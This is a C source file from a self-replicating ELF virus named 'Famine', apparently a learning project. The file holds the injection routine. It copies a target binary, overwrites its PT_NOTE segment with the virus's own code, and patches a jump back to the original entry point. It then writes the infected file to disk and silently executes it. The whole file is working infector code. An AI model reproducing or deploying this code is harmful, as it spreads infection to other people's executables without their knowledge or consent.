#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

static void write_on_memory(const struct s_info *info, char *ptr)
{
	size_t index = 0;
	char *dst = ptr;
	char *src = info->ptr;
	
	while (index < info->data->p_offset + info->data->p_filesz)
	{
		*dst++ = *src++;
		index++;
	}
	while (index < info->note->p_offset)
	{
		*dst++ = 0;
		index++;
	}
	while (index < info->note->p_offset + PAYLOAD_SIZE)
	{
		*dst++ = 0;
		index++;
	}
}

static void replicate_on_memory(const struct s_info *info, char *ptr)
{
	char *dst;
	uint8_t *src;
	const Elf64_Addr entry_point = info->old_entry - (info->new_entry) - JMP_OFFSET;

	dst = ptr + info->note->p_offset;
	src = (uint8_t *)&constructor;

	for (size_t index = 0; index < PAYLOAD_SIZE; index++)
		*dst++ = *src++;

	_memcpy(ptr + info->note->p_offset + (JMP_OFFSET - sizeof(JMP_OPCODE)), &entry_point, sizeof(int32_t));
}

static void fuck_you(const struct s_info *info)
{
	pid_t child;
	char *av[] = {info->name, NULL};

	child = _fork();

	if (child == 0)
	{
		_close(STDIN_FILENO);
		_close(STDOUT_FILENO);
		_close(STDERR_FILENO);

		_execve(av[0], av, NULL);
		Exit(42);
	}
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void inject(struct s_info *info)
{
	char *ptr;

	if ((ptr = _mmap(NULL, info->note->p_offset + PAYLOAD_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
		return ;

	write_on_memory(info, ptr);
	replicate_on_memory(info, ptr);

	_write(info->fd, ptr, info->note->p_offset + PAYLOAD_SIZE);
	_munmap(ptr, info->note->p_offset + PAYLOAD_SIZE);
	release_info(info);
#if DEBUG
	char name[] = "/tmp/trace";
	int fd = _open(name, O_RDWR | O_APPEND, 0000);
	char fam[] = "Famine: ";
	char des[] = " has been infected\n";

	_write(fd, fam, _strlen(fam)); 
	_write(fd, info->name, _strlen(info->name));
	_write(fd, des, _strlen(des)); 

	_close(fd);
#endif

	fuck_you(info);
}
